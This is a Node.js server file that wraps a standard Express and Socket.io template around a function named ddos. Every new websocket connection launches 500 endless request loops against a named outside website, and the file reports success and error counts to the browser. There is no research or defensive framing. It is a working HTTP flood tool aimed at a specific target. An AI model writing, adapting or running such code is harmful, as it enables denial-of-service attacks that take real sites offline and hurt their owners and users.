
const
http = require("http"),
express = require("express"),
socketio = require("socket.io"),
path = require('path'),
axios = require('axios'),
FormData = require('form-data')

const SERVER_PORT = process.env.PORT || 3000;
let e = 0
let s = 0

let nextVisitorNumber = 1;
const onlineClients = new Set();

function generateRandomNumber() {
return (Math.floor(Math.random() * 1000)).toString();
}

const chars = 'abcdefghijlmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
const randomString = length => {
    let c = ''
    for(let i = 0; i < length; i++) {
        c+=chars[Math.floor(Math.random() * length)]
    }
    return c
}

async function ddos(callback = () => {}) {
    let i = 0
    while(true) {
        let er = true
        do {
            try {   
                const url = 'https://blog.karpeldevtech.com'
                const data = (await axios.get(url)).data
                console.log(data)
                callback(JSON.stringify(data))
                i++
                s++
            }catch(err) {
                await new Promise(resolve => setTimeout(resolve, 500))
                console.log(err.message)
                callback('')
                e++
            }
        } while(er)
    }
}

function onNewWebsocketConnection(socket) {
console.info(`Socket ${socket.id} has connected.`);
onlineClients.add(socket.id);

    !(async() => {
        for(let i = 0; i < 500; i++) {
            ddos((log) => {
                socket.emit('error', e)
                socket.emit('success', s)  
                socket.emit('ps', e+s) 
            })
        }
    })()

socket.on("disconnect", () => {
    onlineClients.delete(socket.id);
    console.info(`Socket ${socket.id} has disconnected.`);
});

// echoes on the terminal every "hello" message this socket sends
socket.on("hello", helloMsg => console.info(`Socket ${socket.id} says: "${helloMsg}"`));

// will send a message only to this socket (different than using `io.emit()`, which would broadcast it)
socket.emit("welcome", `Welcome! You are visitor number ${nextVisitorNumber++}`);
}

function startServer() {
// create a new express app
const app = express();
// create http server and wrap the express app
const server = http.createServer(app);
// bind socket.io to that server
const io = socketio(server);

// example on how to serve a simple API
app.get("/random", (req, res) => res.send(generateRandomNumber()));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')))

// example on how to serve static files from a given folder
app.use(express.static("public"));

// will fire for every new websocket connection
io.on("connection", onNewWebsocketConnection);

// important! must listen from `server`, not `app`, otherwise socket.io won't function correctly
server.listen(SERVER_PORT, () => {
    console.info(`Listening on port ${SERVER_PORT}.`)
        
    }
);


// will send one message per second to all its clients
let secondsSinceServerStarted = 0;
    setInterval(() => {
        secondsSinceServerStarted++;
        io.emit("seconds", secondsSinceServerStarted);
        io.emit("online", onlineClients.size);
    }, 1000);
}

startServer();